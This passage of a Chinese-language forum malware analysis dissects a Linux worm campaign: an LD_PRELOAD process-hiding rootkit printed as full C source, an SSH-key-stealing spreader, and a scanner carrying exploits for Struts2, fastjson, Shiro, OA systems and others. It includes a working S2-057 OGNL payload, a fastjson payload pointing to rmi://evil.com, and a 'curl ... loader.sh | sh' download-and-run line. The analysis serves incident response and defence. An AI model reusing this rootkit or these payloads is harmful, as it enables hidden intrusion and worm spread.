
下载processhider.c模块，编译并替换掉`/usr/local/lib/libc2.28.so`,并添加到`/etc/ld.so.preload`中，由此再运行的程序都会优先加载preload中的模块

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <unistd.h>

/*
* Every process with this name will be excluded
*/
static const char* process_to_filter = "kworkers|dbus|autoupdate";

/*
* Get a directory name given a
DIR* handle
*/
static int get_dir_name(DIR* dirp, char* buf, size_t size)
{
int fd = dirfd(dirp);
if(fd == -1) {
return 0;
}

char tmp[64];
snprintf(tmp, sizeof(tmp), "/proc/self/fd/%d", fd);
ssize_t ret = readlink(tmp, buf, size);
if(ret == -1) {
return 0;
}

buf[ret] = 0;
return 1;
}

/*
* Get a process name given its pid
*/
static int get_process_name(char* pid, char* buf)
{
if(strspn(pid,"0123456789") != strlen(pid)) {
return 0;
}

char tmp[256];
snprintf(tmp, sizeof(tmp), "/proc/%s/stat", pid);

FILE* f = fopen(tmp,"r");
if(f == NULL) {
return 0;
}

if(fgets(tmp, sizeof(tmp), f) == NULL) {
fclose(f);
return 0;
}

fclose(f);

int unused;
sscanf(tmp,"%d (%[^)]s", &unused, buf);
return 1;
}
#define DECLARE_READDIR(dirent, readdir)                                \
static struct dirent* (*original_##readdir)(DIR*) = NULL;               \
\
struct dirent* readdir(DIR *dirp)                                       \
{                                                                       \
if(original_##readdir == NULL) {                                    \
original_##readdir = dlsym(RTLD_NEXT, #readdir);               \
if(original_##readdir == NULL)                                  \
{                                                               \
fprintf(stderr,"Error in dlsym: %s\n", dlerror());         \
}                                                               \
}                                                                   \
\
struct dirent* dir;                                                 \
\
while(1)                                                            \
{                                                                   \
dir = original_##readdir(dirp);                                 \
if(dir) {                                                       \
char dir_name[256];                                         \
char process_name[256];                                     \
if(get_dir_name(dirp, dir_name, sizeof(dir_name)) &&        \
strcmp(dir_name,"/proc") == 0 &&                       \
get_process_name(dir->d_name, process_name) &&          \
strstr( process_to_filter,process_name)) {         \
continue;                                               \
}                                                           \
}                                                               \
break;                                                          \
}                                                                   \
return dir;                                                         \
}
DECLARE_READDIR(dirent64, readdir64);
DECLARE_READDIR(dirent, readdir);
```

将上述进程 `kworkers` | `dbus` | `autoupdate` 过滤掉，从而达到隐藏进程的目的

# sshkey.sh（窃密横传，害人害己）

## 样本分析

![](https://bbs.kanxue.com/upload/attach/202107/833287_M92S24T2YWU3HPK.png)
（好家伙，上来就先把同行们和挖矿进程都干掉。。。果然搞tm病毒也内卷，赶快收集一波，以后应急先把这脚本跑一遍）
![](https://bbs.kanxue.com/upload/attach/202107/833287_PQAPME5JXAUEDPF.png)
查询出口ip，查询本地ssh私钥和pem证书文件，最后通过查询knownhost查看连接过的主机
![](https://bbs.kanxue.com/upload/attach/202107/833287_4EG947R7V873R22.png)
最后通过收集到的私钥连接其他机器使其下载loader.sh进行蠕虫式传播，自此也成就闭环

### 总结

具备横传能力，危险系数高

# autoUpdate（杀意四起）

（声明，本人对web洞及java研究不深，如有错误，欢迎探讨）

## 样本分析

首先upx脱壳，好家伙，又一个go程序，查看导出表（找到了大宝藏）
![](https://bbs.kanxue.com/upload/attach/202107/833287_GCPPAKH8QASH6RF.png)
![](https://bbs.kanxue.com/upload/attach/202107/833287_A68Z4YKYRS457ZN.png)
这些main类中的扫描模块，我们一个一个看（当然，攻击模块还有很多，我就不献丑了）

- acutator（springboot未授权）
  相关链接：ff4K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2U0L8X3u0D9L8$3N6K6i4K6u0W2j5$3!0E0i4K6u0r3K9r3g2A6i4K6u0V1P5X3W2Q4x3V1k6H3i4K6u0r3x3e0b7K6y4o6b7%4y4o6y4Q4x3X3g2Z5N6r3#2D9
  - 利用条件
    jolokia接口暴露
    spring使用jolokia-core依赖，并存在MBean
    JDNI注入有版本限制 JDK< 6u201/7u191/8u182/11.0.1 （LDAP）
  - 特征
    `/jolokia/list`
    `ldap://xxxxxx:xxx`（ldap协议）
    `mbean`
    ![](https://bbs.kanxue.com/upload/attach/202107/833287_KMPZUQB4VWC76VJ.png)
    ![](https://bbs.kanxue.com/upload/attach/202107/833287_9MJJ9RSA6KHQ9R2.png)
- xxljob (弱密码登后台?)
  这个无法确定是哪个洞，一开始我以为是XXL-JOB executor未授权。。但始终没找到相关json串
  ![](https://bbs.kanxue.com/upload/attach/202107/833287_WNAPRPWYNUPMXW5.png)
  ![](https://bbs.kanxue.com/upload/attach/202107/833287_6Z86R9R9D2GPMF8.png)
- mongo-express远程代码执行漏洞（CVE-2019-10758）
  相关链接：01eK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6$3N6h3I4Z5N6h3u0Q4x3X3g2G2M7X3N6Q4x3V1k6Q4x3U0y4Q4x3V1k6W2L8Y4k6A6M7X3!0F1L8h3g2F1N6s2y4Q4x3V1k6E0L8$3&6Y4L8#2)9J5k6r3g2^5M7s2u0W2M7%4y4Q4x3V1k6o6g2V1g2Q4x3X3b7J5x3o6p5&6i4K6u0V1x3e0l9%4y4e0S2Q4x3V1j5`.
  - 特征：
    `document=this.constructor.constructor...`
    这个最容易看出来
    ![](https://bbs.kanxue.com/upload/attach/202107/833287_RA89QV98TV5DYJW.png)
- shiro反序列化(cve-2016-4437)
  相关链接：8fcK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6$3N6h3I4Z5N6h3u0Q4x3X3g2G2M7X3N6Q4x3V1k6Q4x3U0y4Q4x3V1k6W2L8Y4k6A6M7X3!0F1L8h3g2F1N6s2y4Q4x3V1k6K6K9r3W2J5L8#2)9J5c8V1y4h3c8g2)9J5k6o6t1H3x3e0k6Q4x3X3b7@1y4o6x3%4i4K6u0r3
  - 特征：
    rememberme和deleteme了
    ![](https://bbs.kanxue.com/upload/attach/202107/833287_3P5FGRPW9VCGYSN.png)
    ![](https://bbs.kanxue.com/upload/attach/202107/833287_2BAAXKAS98QB8QT.png)
- tomcat密码爆破
  （这个以前玩过，哈哈哈）
  ![](https://bbs.kanxue.com/upload/attach/202107/833287_7223C493RD55FFZ.png)
  - 特征明显`/manager` base64(账号:密码)
  - 账号
    ![](https://bbs.kanxue.com/upload/attach/202107/833287_Q9WZ279EETH77DH.png)
  - 密码
    ![](https://bbs.kanxue.com/upload/attach/202107/833287_VWT9N9MVX9TUEDK.png)
- seeyon（致远OA远程代码执行漏洞）
  相关链接：3b9K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6E0M7Y4S2F1i4K6u0W2L8X3g2@1i4K6u0r3L8X3g2%4M7#2)9J5c8U0j5J5x3q4)9J5k6h3S2@1L8h3H3`.
  - 特征
    `/seeyon/htmlofficeservlet`
    `/seeyon/test123456.jsp`
    ![](https://bbs.kanxue.com/upload/attach/202107/833287_Q5JUR7HWZTNK4WX.png)
    ![](https://bbs.kanxue.com/upload/attach/202107/833287_496ESC9A6UDNFS6.png)
    ![](https://bbs.kanxue.com/upload/attach/202107/833287_7MWQGKURXGS9TBG.png)
- seeyon（致远OA任意文件上传）
  相关链接：a52K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2U0L8X3u0D9L8$3N6K6i4K6u0W2j5$3!0E0i4K6u0r3M7$3E0W2N6r3y4Z5M7r3H3@1L8X3g2Q4x3V1k6H3i4K6u0r3x3e0b7#2x3e0f1I4x3e0y4Q4x3X3g2Z5N6r3#2D9
  - 特征
    `/seeyon/thirdpartyController.do.css`
    ![](https://bbs.kanxue.com/upload/attach/202107/833287_4HBRZB47JY4ND5X.png)
- 泛微oa（远程代码执行）
  相关链接：f7bK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1L8r3!0Y4i4K6u0W2j5%4y4V1L8W2)9J5k6h3&6W2N6q4)9J5c8Y4q4I4i4K6g2X3y4o6p5%4y4e0M7J5z5o6m8Q4x3V1k6S2M7Y4c8A6j5$3I4W2i4K6u0r3k6r3g2@1j5h3W2D9M7#2)9J5c8U0p5H3x3e0p5&6z5o6R3@1y4b7`.`.
  - 特征
    `/weaver/bsh.servlet.BshServlet`
    `bsh.script=exec("xxxx")`
    ![](https://bbs.kanxue.com/upload/attach/202107/833287_JRTD6EZMXEGSV4A.png)
    ![](https://bbs.kanxue.com/upload/attach/202107/833287_JAP6YM7ZF643JV2.png)
- 用友oa（远程命令执行）
  相关链接：195K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1L8r3!0Y4i4K6u0W2j5%4y4V1L8W2)9J5k6h3&6W2N6q4)9J5c8X3@1H3i4K6g2X3y4e0R3@1x3K6b7$3x3K6c8Q4x3V1k6S2M7Y4c8A6j5$3I4W2i4K6u0r3k6r3g2@1j5h3W2D9M7#2)9J5c8U0p5I4y4K6f1@1y4K6p5$3y4l9`.`.
  - 特征：
    `/servlet/~ic/bsh.servlet.BshServlet`
    ![](https://bbs.kanxue.com/upload/attach/202107/833287_KTE7A5BSQTAHSVP.png)
    ![](https://bbs.kanxue.com/upload/attach/202107/833287_96S6V24Y7UKFWYX.png)
- 用友oa（GRP-u8注入漏洞）
  相关链接：
  a2dK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2U0L8X3u0D9L8$3N6K6i4K6u0W2j5$3!0E0i4K6u0r3P5i4g2\*7L8s2W2Q4x3V1k6H3i4K6u0r3x3e0x3$3y4K6f1J5x3U0c8Q4x3X3g2Z5N6r3#2D9
  - 特征：
    `/proxy`
    相关xml字符串
    ![](https://bbs.kanxue.com/upload/attach/202107/833287_P2QKVFA44UUXX4J.png)
    ![](https://bbs.kanxue.com/upload/attach/202107/833287_5HGDHXRARGT2HDJ.png)
- docker daemon api 未授权访问
  相关链接：
  3d7K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6$3N6h3I4Z5N6h3u0Q4x3X3g2G2M7X3N6Q4x3V1k6Q4x3U0y4Q4x3V1k6W2L8Y4k6A6M7X3!0F1L8h3g2F1N6s2y4Q4x3V1k6V1L8$3y4C8k6i4u0Q4x3V1k6#2L8X3q4#2N6r3S2G2M7X3W2\*7k6h3c8Q4x3X3c8J5j5$3g2Q4x3V1j5`.
  ![](https://bbs.kanxue.com/upload/attach/202107/833287_X8YGM9HWWB6JHPZ.png)
  ![](https://bbs.kanxue.com/upload/attach/202107/833287_FNUASQ6KAV36UE8.png)
- structs2（包括S008\S013\S015\S016\S045\S046\S057）
  - S008
    相关链接：
    83cK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6$3N6h3I4Z5N6h3u0Q4x3X3g2G2M7X3N6Q4x3V1k6Q4x3U0y4Q4x3V1k6W2L8Y4k6A6M7X3!0F1L8h3g2F1N6s2y4Q4x3V1k6K6N6s2u0#2N6s2x3J5i4K6u0r3M7K6u0Q4x3X3b7H3x3o6S2Q4x3V1j5`.
    - 特征：
      `?debug=command&expression=<OGNL EXP>`
      ![](https://bbs.kanxue.com/upload/attach/202107/833287_2VEB2THFU4YC9CW.png)
      ![](https://bbs.kanxue.com/upload/attach/202107/833287_6TXQTYPQBGAYK3W.png)
  - S013
    相关链接：
    508K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6$3N6h3I4Z5N6h3u0Q4x3X3g2G2M7X3N6Q4x3V1k6Q4x3U0y4Q4x3V1k6W2L8Y4k6A6M7X3!0F1L8h3g2F1N6s2y4Q4x3V1k6K6N6s2u0#2N6s2x3J5i4K6u0r3M7K6u0Q4x3X3b7H3x3e0y4Q4x3V1j5`.
    ![图片描述](https://bbs.kanxue.com/upload/attach/202107/833287_P2MX6B6DUXHV8XU.png)
    - 特征：
      `${(#\_memberAccess`
      ![](https://bbs.kanxue.com/upload/attach/202107/833287_URZJW64X9S6TNUW.png)
      ![](https://bbs.kanxue.com/upload/attach/202107/833287_26Q6BY2HKYWEQ9M.png)
  - S015
    相关链接：
    072K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6$3N6h3I4Z5N6h3u0Q4x3X3g2G2M7X3N6Q4x3V1k6Q4x3U0y4Q4x3V1k6W2L8Y4k6A6M7X3!0F1L8h3g2F1N6s2y4Q4x3V1k6K6N6s2u0#2N6s2x3J5i4K6u0r3M7K6u0Q4x3X3b7H3x3e0g2Q4x3V1j5`.
    - 特征：
      `${#context['xwork.MethodAccessor`
      ![](https://bbs.kanxue.com/upload/attach/202107/833287_ZX97SBFA6SEBESZ.png)
      ![](https://bbs.kanxue.com/upload/attach/202107/833287_BH9R8XVBHEEWHFY.png)
  - S016
    相关链接：
    759K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6$3N6h3I4Z5N6h3u0Q4x3X3g2G2M7X3N6Q4x3V1k6Q4x3U0y4Q4x3V1k6W2L8Y4k6A6M7X3!0F1L8h3g2F1N6s2y4Q4x3V1k6K6N6s2u0#2N6s2x3J5i4K6u0r3M7K6u0Q4x3X3b7H3x3e0k6Q4x3V1j5`.
    - 特征：
      `?redirect`
      ![](https://bbs.kanxue.com/upload/attach/202107/833287_CR5A2KWHFQ55V4X.png)
      ![](https://bbs.kanxue.com/upload/attach/202107/833287_DX254EJTD7WZQ7X.png)
  - S045 （这个函数特征有点像053，并不是045...望渗透大佬指点）
    相关链接：
    075K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6$3N6h3I4Z5N6h3u0Q4x3X3g2G2M7X3N6Q4x3V1k6Q4x3U0y4Q4x3V1k6W2L8Y4k6A6M7X3!0F1L8h3g2F1N6s2y4Q4x3V1k6K6N6s2u0#2N6s2x3J5i4K6u0r3M7K6u0Q4x3X3b7H3y4o6g2Q4x3V1j5`.
    d53K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6$3N6h3I4Z5N6h3u0Q4x3X3g2G2M7X3N6Q4x3V1k6Q4x3U0y4Q4x3V1k6W2L8Y4k6A6M7X3!0F1L8h3g2F1N6s2y4Q4x3V1k6K6N6s2u0#2N6s2x3J5i4K6u0r3M7K6u0Q4x3X3b7H3y4e0y4Q4x3V1j5`.
    - 特征：
      `%{#context['com.opensymphony.xwork2`
      ![](https://bbs.kanxue.com/upload/attach/202107/833287_EPHJ6QPUVCMFBPH.png)
      ![](https://bbs.kanxue.com/upload/attach/202107/833287_964WS96UTKYSBPP.png)
      未匹配到
  - S046 (这个函数特征有点像053，并不是046...望渗透大佬指点)
    相关链接：
    64aK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6$3N6h3I4Z5N6h3u0Q4x3X3g2G2M7X3N6Q4x3V1k6Q4x3U0y4Q4x3V1k6W2L8Y4k6A6M7X3!0F1L8h3g2F1N6s2y4Q4x3V1k6K6N6s2u0#2N6s2x3J5i4K6u0r3M7K6u0Q4x3X3b7H3y4o6k6Q4x3V1j5`.
    07eK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6$3N6h3I4Z5N6h3u0Q4x3X3g2G2M7X3N6Q4x3V1k6Q4x3U0y4Q4x3V1k6W2L8Y4k6A6M7X3!0F1L8h3g2F1N6s2y4Q4x3V1k6K6N6s2u0#2N6s2x3J5i4K6u0r3M7K6u0Q4x3X3b7H3y4e0y4Q4x3V1j5`.
    - 特征：
      WebKitFormBoundary
      ![](https://bbs.kanxue.com/upload/attach/202107/833287_QJYHMR52356XD4Y.png)
      ![](https://bbs.kanxue.com/upload/attach/202107/833287_3CTHF2KQWUJF8MH.png)
  - S057
    相关链接：
    9bbK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6$3N6h3I4Z5N6h3u0Q4x3X3g2G2M7X3N6Q4x3V1k6Q4x3U0y4Q4x3V1k6W2L8Y4k6A6M7X3!0F1L8h3g2F1N6s2y4Q4x3V1k6K6N6s2u0#2N6s2x3J5i4K6u0r3M7K6u0Q4x3X3b7H3y4e0N6Q4x3V1j5`.
    - 特征：
      ```
      ${ ( #dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request['struts.valueStack'].context).(#cr=#ct['com.opensymphony.xwork2.ActionContext.container']).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#a=@java.lang.Runtime@getRuntime().exec('id')).(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))}
      ```
      ![](https://bbs.kanxue.com/upload/attach/202107/833287_84CQRDMMRP6CEFQ.png)
      ![](https://bbs.kanxue.com/upload/attach/202107/833287_ZNBN7C6TCRS29R2.png)
- jenkin插件远程代码执行（不确定）
  ![](https://bbs.kanxue.com/upload/attach/202107/833287_CJAMEDKE6MCN22F.png)
  ![](https://bbs.kanxue.com/upload/attach/202107/833287_EJTDMPV39M4Y9HP.png)
- weblogic console接口远程代码执行漏洞
  - 相关链接：
    639K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2B7K9h3q4F1M7$3S2#2i4K6u0W2j5$3!0E0i4K6u0r3M7q4)9J5c8U0u0U0z5h3f1J5j5K6l9I4j5e0f1J5x3l9`.`.
    ![](https://bbs.kanxue.com/upload/attach/202107/833287_VQ8A8FHGPG28UCB.png)
    ![](https://bbs.kanxue.com/upload/attach/202107/833287_EXZUGEF63EBD9R4.png)
- fastjson 1.2.47远程命令执行
  - 相关链接：
    7c3K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6$3N6h3I4Z5N6h3u0Q4x3X3g2G2M7X3N6Q4x3V1k6Q4x3U0y4Q4x3V1k6W2L8Y4k6A6M7X3!0F1L8h3g2F1N6s2y4Q4x3V1k6X3j5i4y4@1K9Y4y4G2L8W2)9J5c8U0q4Q4x3X3f1J5i4K6u0W2y4o6N6Q4x3X3c8J5j5$3g2Q4x3V1j5`.
  - 相关特征：
    ```
    {
    "a":{
    "@type":"java.lang.Class",
    "val":"com.sun.rowset.JdbcRowSetImpl"
    },
    "b":{
    "@type":"com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName":"rmi://evil.com:9999/Exploit",
    "autoCommit":true
    }
    }
    ```
    ![](https://bbs.kanxue.com/upload/attach/202107/833287_6KPPQ66S43QAVCU.png)

### 其他分析

找到main.DownLoadFile函数，交叉引用
下载dubbo.jar模块
![](https://bbs.kanxue.com/upload/attach/202107/833287_92GB27YRUMGA6GE.png)
下载dubbo.jar对应的攻击参数
![](https://bbs.kanxue.com/upload/attach/202107/833287_QXPF333D4X5R8JZ.png)

# dubbo.jar(止不住的杀意)

## 样本分析

![](https://bbs.kanxue.com/upload/attach/202107/833287_522RYJN3HRW9EXF.png)
可以看到dubbo.jar配置文件中执行的命令为
`curl httlp://m.windowsupdatesupport.org/d/loader.sh | sh`横向传播，即通过已知的web漏洞进行横向传播
![](https://bbs.kanxue.com/upload/attach/202107/833287_E7NVNBJ9M93SZ7E.jpg)
反编译该程序发现包括快速检测和exp(攻击模块)
![](https://bbs.kanxue.com/upload/attach/202107/833287_GTZSFNCFXT735SE.png)
执行的参数如上

# 总结

至此，病毒就分析到这里了，这个样本覆盖的知识面相当全面，拿来练手再合适不过。最近两年针对企业端服务器的各种木马越来越多，二进制与web之间的鸿沟也越来越近，希望各位安全员们以此为戒，全面发展才是未来的出路
参考链接：092K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6E0M7q4)9J5k6i4N6W2K9i4S2A6L8W2)9J5k6i4q4I4i4K6u0W2j5$3!0E0i4K6u0r3M7#2)9J5c8X3E0K9c8i4S2D9d9U0j5J5e0q4k6b7e0$3I4#2k6X3E0#2M7X3S2n7K9Y4M7`.

# 题外话
最近在找工作，希望以此抛砖引玉，找到份自己心怡的工作，工作地点（北京、天津）感谢！！
web新手，文章若分析有误欢迎共同探讨

[传递专业知识、拓宽行业人脉——看雪讲师团队等你加入！！](https://bbs.kanxue.com/thread-275828.htm)

[#调试逆向](https://bbs.kanxue.com/forum-4-1-1.htm)
[#病毒木马](https://bbs.kanxue.com/forum-4-1-6.htm)
